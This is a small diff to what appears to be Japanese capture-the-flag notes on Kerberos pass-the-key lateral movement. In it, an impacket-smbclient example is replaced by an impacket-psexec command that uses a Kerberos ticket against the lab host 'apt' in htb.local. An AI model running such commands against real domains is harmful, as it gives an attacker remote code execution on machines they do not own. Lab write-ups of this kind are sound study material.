@@ -29,5 +29,6 @@ c.f. https://www.thehacker.recipes/ad/movement/kerberos/ptk
 例：
 
 ```
-impacket-smbclient -dc-ip apt -k -no-pass htb.local/henry.vinson@apt
+impacket-psexec -dc-ip apt htb.local/henry.vison@apt -k -no-pass
+
 ```
